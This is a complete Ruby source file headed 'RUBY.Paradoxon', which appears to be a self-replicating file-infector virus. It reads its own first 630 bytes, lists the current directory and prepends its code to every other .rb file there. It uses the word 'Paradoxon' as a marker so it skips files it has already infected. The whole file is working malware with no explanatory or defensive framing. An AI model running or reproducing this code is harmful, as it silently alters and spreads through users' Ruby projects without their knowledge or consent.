# RUBY.Paradoxon
mycode=File.open(__FILE__).read(630)
cdir = Dir.open(Dir.getwd)
  cdir.each do |a|
    if File.ftype(a)=="file" then
      if a[a.length-3, a.length]==".rb" then
        if a!=File.basename(__FILE__) then
          fcode=""
          fle=open(a)
          spth=fle.read(1)
          while spth!=nil
            fcode+=spth
            spth=fle.read(1)
          end
          fle.close
          if fcode[7,9]!="Paradoxon" then
            fcode=mycode+13.chr+10.chr+fcode
            fle=open(a,"w")
              fle.print fcode
            fle.close
          end
        end
      end
    end
  end
cdir.close